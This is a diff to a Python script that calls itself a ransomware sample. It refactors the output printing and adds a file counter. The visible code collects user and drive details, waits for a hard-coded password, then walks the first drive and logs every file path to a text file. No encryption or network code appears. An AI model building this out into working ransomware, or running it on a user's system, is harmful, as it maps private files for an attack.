@@ -8,12 +8,18 @@ import string
 from datetime import datetime
 
 """
-Sample of how works a ransomware
+Sample of how works a ransomware v1.01
 """
 
 
 def dly():
     time.sleep(random.random() / math.pi)
+
+
+def write(value: str) -> None:
+    for char in value:
+        print(char, end='')
+        dly()
 
 
 # Gathering data
@@ -33,9 +39,7 @@ _PersonalFiles = [f'{d}Users\\{_UserName}' for d in _Drives if os.path.isdir(f'{
 _pid = os.getpid()
 _ppid = os.getppid()
 
-for _ in 'Gathering data...\n':
-    print(f'{_}', end='')
-    dly()
+write('Gathering data...\n')
 
 data = {
     '_UserName': _UserName,
@@ -62,27 +66,25 @@ with open('data.txt', 'w') as file:
         print(blue_print)
         dly()
 
-for _ in 'Done.\n':
-    print(_, end='')
-    dly()
+write('Done.\n')
 
 if input('Enter the safeguard password:') != 'secure':
     print('\033[91m')
-    for _ in '-Safeguard password is Wrong!':
-        print(_, end='')
-        time.sleep(random.random())
-        quit()
-        sys.exit()  # make sure program end here
-
+    write('-Safeguard password is Wrong!')
+    quit()
+    sys.exit()  # make sure program end here
+flag = 0
 with open('log.txt', 'w') as log:
     for drive in _Drives[:1]:
-        print(f'Scan( {drive} )')
+        write(f'Scan( {drive} )')
         time.sleep(1)
         for root, dirs, files in os.walk(drive):
+            flag += 1
+            print(f'\r{flag}', end='')
             try:
                 log.write(f'\n{root}\n{dirs}\n{files}\n')
             except Exception as exp:
                 log.write(f'\nSOME ERROR COMING\n')
-                print('Some Error.')
-
-print('Program is End.\n')
+                print('\nSome Error!')
+print(f'\nAll (Scanned) Files: {flag}')
+write('Program is End HERE.\n')
